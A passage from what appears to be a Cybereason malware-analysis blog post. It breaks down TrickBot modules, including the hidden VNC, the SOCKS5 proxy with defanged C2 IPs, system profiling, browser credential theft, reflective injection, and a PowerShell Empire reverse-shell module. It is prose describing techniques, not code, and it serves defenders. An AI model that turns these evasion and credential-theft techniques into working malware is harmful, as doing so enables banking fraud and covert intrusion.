<div><img src="https://lh5.googleusercontent.com/DVlAtcKRbbMJUguBC-WdmZz1BkLi_imRScW1MjJX9NFDmEvAE6w7RSMCrEAmJ9xLagXN-jgcD3_nosTIYOy-ppkotDdjcdh8tBp_QrGtrkqztovxnQWduJ1qRyhMl2_gJQ8lF6QZ" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<div style="text-align: center;"><img src="https://lh5.googleusercontent.com/2tf43QMY5ZmHS7MY2844Q0PYq9Nr7Fu3KhDI4dkPLBBnmqaV1x9AhJuckAjqwMW0r3MHBgt0SdQBjNAemLtqowQBli61jd-to-6R8pZzMD-wrqSGA5lHgkvMFlOX8w_zPYLYexO0" alt=""></div>
<div style="text-align: center;"><img src="https://lh5.googleusercontent.com/IdgBl_t1R3juNDgvja6sQCXkFVVfrTAfmKeWEslk4koIW2Pajl4uC4nORJks-yiglOlHG5t-ZswCS44JV7CxZ3KOcB4vAqy8FYag3neBT1fBGSfCyBNC98jfu7wyDA9667fMMIns" alt=""></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=40&amp;name=triple-threat-blog-24b.png" alt="triple-threat-blog-24b" width="40" loading="lazy" style="width: 40px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=20&amp;name=triple-threat-blog-24b.png 20w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=40&amp;name=triple-threat-blog-24b.png 40w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=60&amp;name=triple-threat-blog-24b.png 60w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=80&amp;name=triple-threat-blog-24b.png 80w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=100&amp;name=triple-threat-blog-24b.png 100w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24b.png?width=120&amp;name=triple-threat-blog-24b.png 120w" sizes="(max-width: 40px) 100vw, 40px"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=40&amp;name=triple-threat-blog-24d.png" alt="triple-threat-blog-24d" width="40" loading="lazy" style="width: 40px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=20&amp;name=triple-threat-blog-24d.png 20w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=40&amp;name=triple-threat-blog-24d.png 40w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=60&amp;name=triple-threat-blog-24d.png 60w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=80&amp;name=triple-threat-blog-24d.png 80w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=100&amp;name=triple-threat-blog-24d.png 100w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24d.png?width=120&amp;name=triple-threat-blog-24d.png 120w" sizes="(max-width: 40px) 100vw, 40px"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=40&amp;name=triple-threat-blog-24a.png" alt="triple-threat-blog-24a" width="40" loading="lazy" style="width: 40px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=20&amp;name=triple-threat-blog-24a.png 20w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=40&amp;name=triple-threat-blog-24a.png 40w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=60&amp;name=triple-threat-blog-24a.png 60w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=80&amp;name=triple-threat-blog-24a.png 80w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=100&amp;name=triple-threat-blog-24a.png 100w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24a.png?width=120&amp;name=triple-threat-blog-24a.png 120w" sizes="(max-width: 40px) 100vw, 40px"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=40&amp;name=triple-threat-blog-24c.png" alt="triple-threat-blog-24c" width="40" loading="lazy" style="width: 40px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=20&amp;name=triple-threat-blog-24c.png 20w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=40&amp;name=triple-threat-blog-24c.png 40w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=60&amp;name=triple-threat-blog-24c.png 60w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=80&amp;name=triple-threat-blog-24c.png 80w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=100&amp;name=triple-threat-blog-24c.png 100w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-24c.png?width=120&amp;name=triple-threat-blog-24c.png 120w" sizes="(max-width: 40px) 100vw, 40px"></em></p>
<p style="text-align: center;"><em>Base 64-decoded pictures.</em></p>
<h4 style="font-size: 30px; line-height: 1.75;">vncsrv.dll</h4>
<p>TrickBot uses a hidden VNC injected into svchost.exe as a <a href="https://en.wikipedia.org/wiki/Remote_access_trojan" rel=" noopener">remote administration tool</a>. The VNC allows an attacker to remotely view and control a victim’s desktop without the victim noticing.</p>
<p>The injected svchost, loaded with vncsrv.dll, spawns a Chrome browser instance. The browser instance launches with a command to alter the browsers default settings to evade detection and bypass security defense mechanisms. In this case, it is the Chrome sandbox. In order to evade detection additionally, TrickBot remains quiet and hidden from the user on the victim machine by disabling any interaction with the user interface, including audio and graphics. The hidden VNC leverages TrickBot’s foothold in order to simplify the process of logging into the victim’s financial institution.&nbsp;</p>
<div><img src="https://lh5.googleusercontent.com/g-aIabKL4EoZwgK81M6xLX_Y6n2MyrUOJVFDnIA-4rRHj2sfFvP9Ebvpkcmn1PqZAHqyquqG9gT7iCng3-3oieiG2JwJA27qQL8NSXx_2iqoPh8G9DS7mDFKfs8lwez66s0iBKlP" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=412&amp;name=triple-threat-blog-25.png" alt="Setting interruption for the Chrome browser" width="412" loading="lazy" style="width: 412px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=206&amp;name=triple-threat-blog-25.png 206w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=412&amp;name=triple-threat-blog-25.png 412w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=618&amp;name=triple-threat-blog-25.png 618w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=824&amp;name=triple-threat-blog-25.png 824w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=1030&amp;name=triple-threat-blog-25.png 1030w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-25.png?width=1236&amp;name=triple-threat-blog-25.png 1236w" sizes="(max-width: 412px) 100vw, 412px"></em></p>
<p style="text-align: center;"><em>Setting interruption for the Chrome browser.</em></p>
<h4 style="font-size: 30px; line-height: 1.75;">socks5dll.dll</h4>
<p>In previous iterations, this module communicated with the TrickBot C2 server using the socks protocol to tunnel data and connections through the victim’s host. socks5 brings additional authentication, so that only authorized users can access the proxy tunnel. socks5 supports the tunneling of DNS requests, which eliminates the threat of DNS leaks. socks5dll.dll has hardcoded C2 servers that it will create an authenticated connection with.</p>
<div><img src="https://lh4.googleusercontent.com/TOlWMflTpg1gREorwP4HeQ7BCVyEAmfkq9eKs4CQAphxhZwI0NBBlPXpy2DBfdypdUhoFhJZNQpwIu_CmUUsSXLzFG_ZHA5-Uh7NPKnpMzTSLegOJvFyz_JhnHWo9xWTE95uZtWa" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=197&amp;name=triple-threat-blog-26.png" alt="TrickBot C2 server" width="197" loading="lazy" style="width: 197px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=99&amp;name=triple-threat-blog-26.png 99w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=197&amp;name=triple-threat-blog-26.png 197w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=296&amp;name=triple-threat-blog-26.png 296w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=394&amp;name=triple-threat-blog-26.png 394w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=493&amp;name=triple-threat-blog-26.png 493w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-26.png?width=591&amp;name=triple-threat-blog-26.png 591w" sizes="(max-width: 197px) 100vw, 197px"></em></p>
<p style="text-align: center;"><em>The Cybereason Platform information on the TrickBot C2 server.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=1140&amp;name=triple-threat-blog-27.png" alt="connection to the TrickBot C2 server" width="1140" loading="lazy" style="width: 1140px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=570&amp;name=triple-threat-blog-27.png 570w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=1140&amp;name=triple-threat-blog-27.png 1140w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=1710&amp;name=triple-threat-blog-27.png 1710w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=2280&amp;name=triple-threat-blog-27.png 2280w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=2850&amp;name=triple-threat-blog-27.png 2850w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-27.png?width=3420&amp;name=triple-threat-blog-27.png 3420w" sizes="(max-width: 1140px) 100vw, 1140px"></em><img src="https://lh5.googleusercontent.com/AQQHdAFc53g8mKHMyLFGNbte96PX4GGk1e5uf0iqg_2jXtdnTU2KO4d314btLtQyfs4q7652Xl3BNN0Deas5NWThUgJadbGNLeNntWrXPSD0R5I7ZBRImDCgf7vVMBZZBzD12gaA" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>&nbsp;The connection to the TrickBot C2 server as shown in the Cybereason Platform.</em></p>
<p>&nbsp;The malware uses a user agent: Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US) to connect to one of the hard-coded TrickBot C2 IPs in socks5dll.dll:</p>
<ul>
<li><span style="font-size: 18px;">69.164.196[.]21</span></li>
<li><span style="font-size: 18px;">107.150.40[.]234</span></li>
<li><span style="font-size: 18px;">162.211.64[.]20</span></li>
<li><span style="font-size: 18px;">217.12.210[.]54</span></li>
<li><span style="font-size: 18px;">89.18.27[.]34</span></li>
<li><span style="font-size: 18px;">193.183.98[.]154</span></li>
<li><span style="font-size: 18px;">51.255.167[.]0</span></li>
<li><span style="font-size: 18px;">91.121.155[.]13</span></li>
<li><span style="font-size: 18px;">87.98.175[.]85</span></li>
<li><span style="font-size: 18px;">185.97.7[.]7&nbsp;</span><br><br></li>
</ul>
<h4>systemInfo.dll</h4>
<p>systemInfo.dll helps the attacker determine if the affected machine meets the criteria for infection with the Ryuk ransomware. TrickBot uses this module to harvest system information off of the infected machine to provide attackers with a better understanding of the system they have infected. It uses <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wql-sql-for-wmi&amp;sa=D&amp;ust=1554143122716000">WQL</a> to query win32_Processor and harvest information about the processor of the machine and the system architecture (whether it is 32-bit or 64-bit).&nbsp;</p>
<div>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=929&amp;name=triple-threat-blog-28.png" alt="The use of WQL by systeminfo.dll" width="929" loading="lazy" style="width: 929px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=465&amp;name=triple-threat-blog-28.png 465w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=929&amp;name=triple-threat-blog-28.png 929w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=1394&amp;name=triple-threat-blog-28.png 1394w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=1858&amp;name=triple-threat-blog-28.png 1858w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=2323&amp;name=triple-threat-blog-28.png 2323w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-28.png?width=2787&amp;name=triple-threat-blog-28.png 2787w" sizes="(max-width: 929px) 100vw, 929px"></div>
<p style="text-align: center;">&nbsp;</p>
<p style="text-align: center;"><em>The use of WQL by systeminfo.dll.</em>&nbsp;</p>
<p>TrickBot also uses native Windows API functions <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getnativesysteminfo&amp;sa=D&amp;ust=1554143122717000">GetNativeSystemInfo</a><em>()</em> and <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsysteminfo&amp;sa=D&amp;ust=1554143122718000">GetSystemInfo</a><em>()</em> to get more information about the machine.</p>
<div><img src="https://lh4.googleusercontent.com/OVER6jcgsrtpUD6znVWJ0058txXBXTKI5ZE2S9s_CO4Wp3W91rQyfn-iGQnG57Njy3zSHEvwDvYFivce4ERUBaogKCwPlKpX-1w0025jtNk1J3PRafVhpN1bP-190kj5IrUcOTM9" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=823&amp;name=triple-threat-blog-29.png" alt="native Windows API being used to harvest information by systeminfo.dll" width="823" loading="lazy" style="width: 823px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=412&amp;name=triple-threat-blog-29.png 412w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=823&amp;name=triple-threat-blog-29.png 823w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=1235&amp;name=triple-threat-blog-29.png 1235w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=1646&amp;name=triple-threat-blog-29.png 1646w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=2058&amp;name=triple-threat-blog-29.png 2058w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-29.png?width=2469&amp;name=triple-threat-blog-29.png 2469w" sizes="(max-width: 823px) 100vw, 823px"></em></p>
<p style="text-align: center;"><em>The native Windows API being used to harvest information by systeminfo.dll.</em></p>
<h4>mailsearcher.dll</h4>
<p>mailsearcher.dll searches all files on disk and compares their extensions to a predefined list.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=660&amp;name=triple-threat-blog-30.png" alt="predefined list of extensions the malware searches for" width="660" loading="lazy" style="width: 660px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=330&amp;name=triple-threat-blog-30.png 330w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=660&amp;name=triple-threat-blog-30.png 660w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=990&amp;name=triple-threat-blog-30.png 990w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=1320&amp;name=triple-threat-blog-30.png 1320w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=1650&amp;name=triple-threat-blog-30.png 1650w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-30.png?width=1980&amp;name=triple-threat-blog-30.png 1980w" sizes="(max-width: 660px) 100vw, 660px"></p>
<div><img src="https://lh5.googleusercontent.com/75iJZi-dUwJeRJz0a_BhG1O8YF5KVeOYFsSD5UaZOSud0G7cMRbF0S1873UJc7hmo-qdGxL0-OWKBxiXKkfYrIzDAHn0unVOCjlPRLA1-DIaSXAbyk0Yhv8yjjcldW3TKNR5biBQ" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>A predefined list of extensions the malware searches for.</em></p>
<p>mailsearcher.dll also uses the <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/winhttp/about-winhttp&amp;sa=D&amp;ust=1554143122720000">WinHTTP library</a> in order to send data over HTTP to the C2 server.</p>
<div><img src="https://lh5.googleusercontent.com/xfQHWM-dO7NVpWRNM8_9rasNOrnlWxr2dr9KoAsVIjYu7Del0EuTVG1Htn35xc5g5DBzcAvN3IdjyMlWyYqgoo5j2BobEp93u1SaR1jRGoxjQJeYKs6UL_49ZnpNPmoDljl9TnrP" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=681&amp;name=triple-threat-blog-31.png" alt="triple-threat-blog-31" width="681" loading="lazy" style="width: 681px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=341&amp;name=triple-threat-blog-31.png 341w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=681&amp;name=triple-threat-blog-31.png 681w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=1022&amp;name=triple-threat-blog-31.png 1022w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=1362&amp;name=triple-threat-blog-31.png 1362w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=1703&amp;name=triple-threat-blog-31.png 1703w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-31.png?width=2043&amp;name=triple-threat-blog-31.png 2043w" sizes="(max-width: 681px) 100vw, 681px"></em></p>
<p style="text-align: center;"><em>The use of the WinHttp library.</em></p>
<h4>loader.dll</h4>
<p>loader.dll’s purpose is solely to ensure that other modules will be successfully loaded reflectively.</p>
<h4>pwgrab.dll</h4>
<p>pwgrab.dll harvests saved user credentials from browsers, registry keys, and other programs such as Outlook.&nbsp;</p>
<p>TrickBot steals username and password information by copying login db, and steals card details by copying webdata db. All of the information stored is encrypted, so TrickBot uses a decryption mechanism and saves the data as plain text.&nbsp;</p>
<div><img src="https://lh3.googleusercontent.com/NWKCOhjDd4EtelYTV5-Uyn7dvfbW-QmslhVUmYIay9J3bbA-CnZUgb_8uw8OSlSqEz9gdZ99yUkrpELTnNTQ4kVFV0PHkFupdbX3DAj4_7ZzP1qm8qNU1JTrVKVx8JRhT74Zuzyj" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=1130&amp;name=triple-threat-blog-32.png" alt="triple-threat-blog-32" width="1130" loading="lazy" style="width: 1130px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=565&amp;name=triple-threat-blog-32.png 565w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=1130&amp;name=triple-threat-blog-32.png 1130w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=1695&amp;name=triple-threat-blog-32.png 1695w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=2260&amp;name=triple-threat-blog-32.png 2260w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=2825&amp;name=triple-threat-blog-32.png 2825w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-32.png?width=3390&amp;name=triple-threat-blog-32.png 3390w" sizes="(max-width: 1130px) 100vw, 1130px"></em></p>
<p style="text-align: center;"><em>TrickBot copying the Chrome database files.</em></p>
<h4>core-dll.dll</h4>
<p>core-dll.dll is the main TrickBot bot. There are two layers of protection the malware must remove before it can be used. This module is encrypted and stored inside the loader as one of the resources. Following the decryption and unpacking, it is reflectively injected into the following browsers to steal credentials.</p>
<div><img src="https://lh4.googleusercontent.com/5LSSWyD_OM0YTumawd81_YoNbqOJFxcFSoT-4O28vsSP-MzHmZRweYtl-7b4RJPBnIrYUep1RA04psVsm-fAeOyPxbzqvwrBJ3XlA-4jjClWZ9EGlB9eL7oOwvxpsJKrPzV_jSf1" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=184&amp;name=triple-threat-blog-33.png" alt="triple-threat-blog-33" width="184" loading="lazy" style="width: 184px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=92&amp;name=triple-threat-blog-33.png 92w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=184&amp;name=triple-threat-blog-33.png 184w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=276&amp;name=triple-threat-blog-33.png 276w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=368&amp;name=triple-threat-blog-33.png 368w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=460&amp;name=triple-threat-blog-33.png 460w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-33.png?width=552&amp;name=triple-threat-blog-33.png 552w" sizes="(max-width: 184px) 100vw, 184px"></em></p>
<p style="text-align: center;"><em>The browsers targeted in core-dll.dll.</em></p>
<div><img src="https://lh4.googleusercontent.com/y7_bbeYZn397KKHiHyh5wXazBxd8YSprtkYwv_zvfI6m_YoeaCYRGCAAda8Gpc1TyJT1MthSCssz2pyhYhYndNpBlta5yGHpFXBMpsTR_Bs9TzVLLCccuiN7XBPwb8frccoedbGX" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=1014&amp;name=triple-threat-blog-34.png" alt="triple-threat-blog-34" width="1014" loading="lazy" style="width: 1014px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=507&amp;name=triple-threat-blog-34.png 507w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=1014&amp;name=triple-threat-blog-34.png 1014w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=1521&amp;name=triple-threat-blog-34.png 1521w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=2028&amp;name=triple-threat-blog-34.png 2028w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=2535&amp;name=triple-threat-blog-34.png 2535w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-34.png?width=3042&amp;name=triple-threat-blog-34.png 3042w" sizes="(max-width: 1014px) 100vw, 1014px"></p>
<p style="text-align: center;"><em>Exporting the reflective DLL injection library.</em></p>
<h3>dll.dll</h3>
<p>TrickBot’s reverse-shell module, dll.dll, is responsible for two things. First, it performs reconnaissance in order to collect information about the target machine. Second, it launches <a href="https://github.com/EmpireProject/Empire" rel=" noopener">Powershell Empire</a> to perform reconnaissance activities with the end goal of launching an Empire backdoor. In order to initiate reconnaissance, TrickBot uses this DLL to run commands such as ipconfig, net commands, and nltest.&nbsp;</p>
<div><img src="https://lh5.googleusercontent.com/bPk1k_dObz57rfLKvJDXi_aNe2qIfkFFcB91R6L84kFUTQNx082d763HVQCwUhmr0Cju7SV4lfMZ3NJlIKGSOZ_baCuJFpR2-1IzpKf1FBhCPHr41q648vaIKAiHQjk5qEqd363J" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=482&amp;name=triple-threat-blog-35.png" alt="triple-threat-blog-35" width="482" loading="lazy" style="width: 482px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=241&amp;name=triple-threat-blog-35.png 241w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=482&amp;name=triple-threat-blog-35.png 482w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=723&amp;name=triple-threat-blog-35.png 723w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=964&amp;name=triple-threat-blog-35.png 964w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=1205&amp;name=triple-threat-blog-35.png 1205w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-35.png?width=1446&amp;name=triple-threat-blog-35.png 1446w" sizes="(max-width: 482px) 100vw, 482px"></p>
<p style="text-align: center;"><em>A breakdown of the reconnaissance activity of TrickBot by the Cybereason Platform.</em></p>
<div><img src="https://lh5.googleusercontent.com/m2IxxpL00VLDCO1-I1ULCHMyGr9YiFIx9fFdk4L5lUP8wcwEjAHnex-AB7WQwtRBiFYybsvQd0PDLSE-Wa35-ndMXduOzX1hd7TMe9z0yOdO9dNLTMNdhf-3eg98_Fy_vV7RBtVR" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=314&amp;name=triple-threat-blog-36.png" alt="triple-threat-blog-36" width="314" loading="lazy" style="width: 314px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=157&amp;name=triple-threat-blog-36.png 157w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=314&amp;name=triple-threat-blog-36.png 314w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=471&amp;name=triple-threat-blog-36.png 471w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=628&amp;name=triple-threat-blog-36.png 628w, 